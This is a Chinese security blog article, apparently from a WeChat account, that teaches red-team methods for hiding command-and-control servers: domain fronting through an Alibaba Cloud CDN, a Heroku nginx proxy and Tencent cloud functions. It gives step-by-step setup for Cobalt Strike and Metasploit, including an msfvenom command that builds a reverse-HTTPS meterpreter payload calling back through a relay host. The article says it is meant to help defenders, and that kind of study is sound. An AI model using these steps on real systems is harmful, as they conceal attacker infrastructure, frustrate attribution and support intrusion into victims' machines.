> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/D9jA1a8oFdrvbOXerRat1g)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrdF3RetT4UEt2ZBu3dZzvKBOT5exzUBdp3Wag8NDcL7Y3Jk0tWaJ2Pg/640?wx_fmt=png)

  

**前记**

  

随着 HW 的开始，蓝队弟弟们见识到了很多奇特的操作，本文主要从监测溯源时比较常见的一些红队的隐匿手法进行讲解。在实际攻防中有效的隐匿我们的 C2 主机也是很必要的，在工作的同时发现很多蓝队对此并不熟悉，所以本文会深入浅出的讲解三种常见的方式，希望通过本文能够对各位有所帮助。

  

**域前置**

  

域前置技术就是通过 CDN 节点将流量转发到真实的 C2 服务器，其中 CDN 节点 ip 通过识别请求的 Host 头进行流量转发。这里作者利用阿里云全站加速 CDN 实现任意 HOST 头修改，利用构造高信誉域名，从而实现绕过流量分析。

*   ### **第一步**
    

访问阿里云 CDN 全站加速配置，如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr8cAoupqM3ibAIicZtHaur9AJxoQGI5CeqPlZ2DG6H8zichmAsmq7sDf5w/640?wx_fmt=png)

点击添加域名，填写 CDN 基本信息，加速域名处可以填写高信誉的域名，在国内绝大数的服务商，都需要验证主域名的归属，但是在阿里云全站加速 CDN 中只要 IP 是本用户阿里云的主机即可绕过验证。只需要填写加速域名以及 IP 即可完成配置，搭配 CobaltStrike profile 即可绕过达到隐蔽真实 IP 及 Header 的功能，进行隐蔽 IP 的功能。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrIr3Dq0ia8ucgTibWInAiapnv4wAMdYLqBiaFLNwVPjVoplLsCiaIPhUoLBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrtZWt64Yw4zR9eDh4GU8enXJmsibVRxw82OeNJialBibvG3VlHMuiat9icRw/640?wx_fmt=png)

如上图即填写完毕，之后等待 CDN 配置完毕即可正常使用。

*   ### **第二步**
    

使用多地 ping 对 CNAME 进行检测，得到多地 CDN 的 IP。  
全网 PING:http://ping.chinaz.com/

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZreYwG1ib5SZ1kNjW9ibFhOj5alcCGGiakLwNV1v144FTlcNlyQhBC5Gc4A/640?wx_fmt=png)

这里使用用三个演示效果即可。  
58.215.145.105  
61.168.100.175  
42.48.120.160

*   ### **第三步**
    

使用得到的 IP，进入 CobaltStrike，配置 profile 文件。  
这边使用的 profile 是 amazon.profile，其实也可以自己写。  
下载地址:

https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile  
修改三处，header “Host” 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZreY8IK9lyvYkYlicmOzcJreE0njawibdzkkN5OMnhKjF0MjhvicUicfziaJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrW4Z34j2qZE1Du1taqlODtLt9kv6YTQUut8PET0MyMDiaDLibCEoaVsTA/640?wx_fmt=png)

*   ### **第四步**
    

开启 CobaltStrike，开启命令:  
&nbsp;&nbsp;&nbsp;&nbsp;./teamserver xxx.xxx.xxx.xxx password amazon.profile  
进入 CobaltStrike 进行配置，监听器配置如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrUmGQDbj9OvhK5pyicHXf0dfm9oDN5EWUibw9cQpzK1aPP9ibjmgtbGVug/640?wx_fmt=png)

配置 HTTPS Hosts 为之前获取的 CDN IP，HTTP Host(Stager) 为 nanci.tencent.com，也就是我们配置的加速域名，端口默认 80 即可。  
然后开启监听器，生成木马。

发现成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrIfoZUjZJ6tfaT1nmCVGqypceVuJ0qHOAk5x4kibLL8k7qgrlbnPydKw/640?wx_fmt=png)

并且使用 netstat 可以看到我们的网络连接为之前的两个负载 IP。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZryECEgkZrbTCw18J7TtIkTg11uicsKicxLmdp0icfP5nge2rs4UVpnSNog/640?wx_fmt=png)

如上图可以看到数据包的 Host 为 nanci.tencent.com

至此域前置成功部署！

*   ### **总结**
    

配置简单  
延展性强，可以随时更换 IP，在红蓝对抗时可以快速部署，增加了防守封禁 IP 的难度。  
Host 高信誉域名。  
注意阿里云不支持 https 的域前置  
缺点：对 CDN 资源较大，不建议长时间使用（土豪除外）。

在前几天微步公开的情报中，提到了这一种攻击方式，所以作者在这里剖析了域前置的利用方式，希望能够对蓝方成员监控时有所帮助。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZricm40kSGIF8Ma0oxlfAm8U81wU0ZR2qmoXVK8dIRre0qER1gYJSvicZg/640?wx_fmt=png)

  

**Heroku 代理隐匿真实 IP**

  

Heroku 是一个支持多种编程语言的云平台即服务。简单理解就是可以免费部署 docker 容器并且可以开放 web 服务到互联网. 下面介绍操作步骤。其实简单来理解应用在 C2 隐匿上就是通过 Nginx 反向代理的方式，从 heroku 服务器代理到我们真实的 VPS 服务器。

*   ### **Heroku 在 CobaltStrike 中的应用**
    

**第一步**

注册 heroku 账号，这里需要注意的是需要使用 gmail 邮箱注册，因为 QQ 以及 163 等国内邮件服务商被禁用，无法完成注册。  
注册网址：https://dashboard.heroku.com/

**第二步**

注册成功后进行登录，访问以下网址进入配置页面。  
https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrRBRPdOjZ3MQATvLVBA6Dgz5utrz1VR4jicRZic5wUaGW51Zfk1AgWu4A/640?wx_fmt=png)

这里主要需要的是箭头所指的两处，其中 App name 为子域名前缀的名称，这里我们可以自定义，只要没有被注册过不重复即可。

而 TARGET 处，填写为我们真实的 VPS 服务器的域名，也就是需要代理的主机域名。这里格式为:https://baidu.com:8443，代理 VPS 的 8443 端口。

填写完毕后点击 Deploy app 自动部署。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr17eo8qiakxufJcciaqCtg1aibhYOzXPJiag9paib2dwrbLYyE6OCuVUn4kQ/640?wx_fmt=png)

如上图所示即配置成功。

**第三步**

在 Cobaltstrike 中配置两个监听器，设置 PAYLOAD 为 Beacon HTTPS，HTTPS Hosts 为 sict.icu 也就是我们真实的域名，HTTPS Port 为 8443 端口。

监听器 1 如下图所示:

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr8CTSWH7icPoAJFXAkgofFa9CiaRlhTeDeDoC540rXUnAIIEUl43JPZqg/640?wx_fmt=png)

继续配置第二个监听器，同样设置 PAYLOAD 为 Beacon HTTPS，HTTPS Hosts 设置为 nancicdn.herokuapp.com，也就是之前获取到的 heroku 的域名。  
其中部署时配置的 App name 为子域名前缀，所以最终得到的 heroku 的域名就是 nancicdn.herokuapp.com。HTTPS Port 设置为 443。

监听器 2 如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr5VTguHibpEHv5d7zYwtibviaol1XZflT21xcZcicTG6ib6YNusqYIZURTDQ/640?wx_fmt=png)

监听器全部部署完毕后生成木马文件，注意生成木马的监听器设置为监听器 2，也就是指向 heroku 域名的那一个监听器。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrO6P7CK9gYO9ncsDQQFPibeODxFIg8yH8WWWM60lTl8oukkseBx9I7XA/640?wx_fmt=png)

成功上线 Cobaltstrike

*   ### **Heroku 在 Metasploit 中的应用**
    

heroku 服务的配置这里就不再赘述，直接从 Metasploit 的配置开始讲解。

**第一步**

打开 msf  
在 metasploit 中添加 handler, 配置如图：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrv47y2F3jgnPuNJIfDZhsOMGYYMjAetFibTHgSLCU7Cf4mJQcJkEDdRw/640?wx_fmt=png)

使用模块 payload/windows/x64/meterpreter_reverse_https  
设置 LHOST 为我们实际指向的域名，LPORT 为 8443，是在 heroku 中配置的。  
然后设置三个全局参数，如下：  
setg OverrideLHOST nancicdn.herokuapp.com  
setg OverrideLPORT 443  
setg OverrideRequestHost true

OverrideLHOST 为我们 heroku 的地址，后面主域名为固定的，子域名前缀为刚才 heroku 中配置的 App name。端口为 443 因为我们配置的是 https 协议。  
参数配置完毕后，输入 to_handler 开启监听。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrh6VQwLx7fmOO1TGfgn5tficHsDSMyTU4bNFCxeuue0OUF9RRLhcpcng/640?wx_fmt=png)

如上图可以看到已经开启 8443 端口的监听，即配置完毕。

**第二步**

使用命令生成木马  
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=nancicdn.herokuapp.com LPORT=443 -f exe -o payload.exe  
然后将生成的木马上传至虚拟机并执行。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr5VLfF9rmGKd4RicHC8NzraqWuYuclrHou7n0bTwvFY22kSrIxTfWPVQ/640?wx_fmt=png)

执行后发现在 metasploit 成功上线。

可以看到 session 的链接地址为 heroku 中转服务器地址，而且不同的 heroku 部署其连接的 IP 是不相同的。

如下图：  
Target 1

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrsxj8nYIO4gT2N9fibXia9icckVw78H9jocNfq2ibOmEEtV9TPFHVu91tjg/640?wx_fmt=png)

Target 2

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr3Wibr3tnusMTVjNsHnibrkHrbg5epunLVqiah4FzWBQ6ce7duHiaf9hApg/640?wx_fmt=png)

*   ### **总结**
    

heroku 隐藏 C2 从技术原理上看非常简单, 使用 heroku 服务部署 nginx 反向代理服务, payload 连接 heroku 的 nginx,nginx 将流量转发到 C2。  
具体优势如下:

*   只需要注册 heroku 免费账号即可
    
*   无需注册或购买域名
    
*   自带可信的 SSL 证书 (heroku 域名自带证书)
    
*   如果 IP 地址被封锁, 可删除原有 heroku app 重新部署 heroku app(大约需要 30s), 与防守人员持续对抗
    
*   操作步骤简单
    

  

**云函数**

  

这个技术最先是在今年的 3 月份国外提出的，他们利用 azure 对 C2 进行隐藏，国内也有相对应的 云函数厂商，于是我们就尝试使用云函数对我们的 C2 服务器进行隐藏。

*   ### **配置过程**
    

点击新建云函数，选择创建方式—自定义创建，函数名称自定义或者默认都可以，运行环境选择 python3.6，当然也有师傅去用其他语言版本去写但是原理都是一样的，地域随意即可。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrEBiaT9icvLaBORR05fUZ0sHJ4CrHBPfH0BSxgcxwjvlnULNZlLXse8MA/640?wx_fmt=png)

点击完成，我们先不编辑云函数代码。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrPRQ7TDuNNNCJqfNdYp2yibot0uEDicFicjpFH4zicMEnGTYeKvOjxfyQiaw/640?wx_fmt=png)

创建触发器，具体配置如上图，我们使用 API 网关来进行触发函数。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrBKa4786PAEPrKoXdouHPJ1JWBDicaXnzRrbNMBOx8t9ibJibAxDjyZLnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrBx02SKCoSgju0A39rE45oUY1JzjXglibYSlKa1qBicRpq8kWWKDWXGkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrS2Vv5mNEUvclx1ArSEN67biac8o4QFDRVEh4licEZD4WLmy3RxNXMWqA/640?wx_fmt=png)

按照上例图片配置一下 API 网关的默认路径，然后选择立即完成并发布任务即可。

然后我们编辑一下云函数，注意修改 C2 变量的内容为自己 ip 即可。下面的使用 x-forward-for 来确认目标主机的真实 ip，不配置的话不影响正常使用，但是上线主机的 ip 会是云函数主机的 IP 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrTn4dL1kxyljdcfpYKVDDjrmbubodsEZfCa0Be3FFytjP0M5DI96MeQ/640?wx_fmt=png)

这里配置完成后，我们得到 API 网关地址如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr2WDIScsRgNjcicW3CyGDpSkdS7zib2r8FwN4Pv4fg97NtEJciaAMMMqeQ/640?wx_fmt=png)

注意发布

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr0TcqCl4VnxMBI6ics8rkvCWgkA4KWuojicZJEN1AL3KibrbVSu1QR2RPQ/640?wx_fmt=png)

然后我们开始配置 CS 客户端，创建一个监听器，配置如下图，把 API 网关地址复制进去，注意端口必须设置为 80，如果想要设置为其他的还需要配置一下云函数。

设置 profile 文件启动，配置文件 http-config 设置如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZricM0QgZqj4HYrNSjsnqBt0yOj21vJr1qkNHwJBAPZSCGBchJn2hYIjw/640?wx_fmt=png)

这里是为了与上面的云函数同步使用 X-Forward-For 来获取真实 ip

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZrQXMz82RDnG5eTdcKQP59TBOm0BaBh5xSHzicicQOe7WVlZibvrP4iaAAqg/640?wx_fmt=png)

然后我们生成木马进行上线。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZraibXwNIcOhRkyHicaYibG77Aq4FOa6HPbjGTWDFoia98EPKte0kvRwxUrQ/640?wx_fmt=png)

成功上线！

下面我们来分析一下木马程序，首先查看本地外联 ip 为腾讯云 IP 地址

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr4LZkdx4FBBuDSjeKPgsJb6icqC3MmVCDM9ple2BUjiceXLAbjQuUic41A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZr4jbIhd0LhoIh1iczYLKrZ3NnFMZ8gS7cuWs0TkHZgEoPqTTpVXh8gsQ/640?wx_fmt=png)

发现是腾讯云主机  
继续分析上传病毒样本至微步平台 (这也是蓝队成员最常用的分析手段)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4CjF9piabQUaUQR8LqhbeZribVTc9wO3RyKPDECdbX7UN7ibYQmhRpRYLVibIAmWic6ys3iaQAjFnJvXTQ/640?wx_fmt=png)

可以看到只能捕获到 API 网关域名。

*   ### **总结**
    

云函数的好处就是配置简单，免费，高效，很适合日常渗透使用。  
嘿嘿，写到最后就不太想凑字数了。

  

**后记**

  

本文到这里就接近尾声了，正值 HW 时期，希望本文能够对广大防守方成员有所帮助。面对红队的隐匿技术，在工作中碰到这种问题可以第一时间进行响应研判，当然以上的几种方式都不太好溯源，这也是时至今日这些方法依旧有效的原因，尤其是今年的 HW 中，这些方式更加频繁的映入我们的眼帘。今年不仅仅是大量的 0day 爆出，也有一些奇技淫巧的产生，在检验企业安全体系能力的同时也在磨练红蓝双方人员的实力，这也是红蓝对抗的意义所在。

最后，小安是我好大哥！(打工人小安)~

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)  

```
- End -

精彩推荐
新书推荐 | 《白帽子安全开发实战》

【技术分享】赏金$35000的GitHub漏洞：攻破GitHub私有页面

【技术分享】etcd未授权访问的风险及修复方案详解

5亿+用户数据遭泄，Facebook归因网络爬虫可还行？


戳“阅读原文”查看更多内容
```